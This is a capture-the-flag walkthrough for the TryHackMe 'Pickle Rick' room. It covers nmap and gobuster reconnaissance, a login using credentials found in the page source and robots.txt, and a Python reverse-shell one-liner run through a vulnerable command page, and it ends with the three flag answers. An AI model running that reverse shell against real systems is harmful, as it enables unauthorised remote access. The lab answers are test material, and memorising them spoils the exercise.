# Pickle Rick

`export IP=10.10.121.64`

## Recon

The first part of searching this box is to do recon on the machine first to find the ports that the box has open so to do this is to do an initial nmap scan `nmap -sC -sV -oN nmap/initial $IP -v` [initial scan](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/nmap/initial) after doing the initial scan we can to do a full scan of the system `nmap -p- -sC -sV -oN nmap/full $IP`[full scan](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/nmap/full)

while the full scan is running we can do a gobuster scan of the ip to find what is available on the webpage `gobuster dir -u http://$IP:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` [gobuster scan](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/gobuster/sitescan) from that scan it shows only two folders and no pages so we should look at the main webpage by going to the IP.

##WebPage Recon

So the first thing to do is to go to the webpage and we are greeted with this page.

![web page](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/InitialPage.PNG)

looking at the page there is nothing of interest so we can look at the source code of the page

![home page source code](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/InitialPageSC.PNG)

from that page we get the user name `R1ckRul3s`. But there is nothing of any importance so the next thing to do is see if there is a robots.txt page.

![robots.txt page](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/Robots.txt.PNG)

if we look at that page it gives us `Wubbalubbadubdub` which we make a not of as it may come in useful in the future. As we still have no other pages available we can look in the assets folder on the webpage.

![assets folder](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/assets.PNG)

It shows a page with linkes images as wel as the bootstrap code so looking at the images we can try and use those names as potential page names for this task we can use it as a [wordlist](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/gobuster/custom.txt) to search against the page with the code  `gobuster dir -u http://$IP:80 -w /usr/share/wordlists/dirbuster/customlist.txt -x php,txt,html`[custom search](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/gobuster/custom). From that search we can see that there is a page caled portal.php so the next stage is to browse to that page. 

![portal page](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/portal_login.PNG)

Once we go to that page we can login to the portal page and once we logged in there is a commands page which looks like it is vulnrable and allows us to access the page via a reverse sheel with python by running this code `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` This allows us access to the box.

![commands page](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/portal.PNG)

Once we have access to the box we need to find the ingredients.

the first ingerdient can be found by doing a simple ls

![ingredient one](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/SecretIngredient1.PNG)

*Answer the first ingredient is mr. meeseek hair*

We still have to find two ingredients the second ingredient can be found by looking in the home directory of rick

![second ingredient](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/SecretIngredient2.PNG)

*Answer the second ingredient is 1 jerry tear*

the third ingredient can be found in /root

![third ingredient](https://github.com/tigercub-co/TryHackMe/blob/master/Pickle_Rick/images/SecretIngredient3.PNG)

*Answer the third ingredient is fleeb juice*
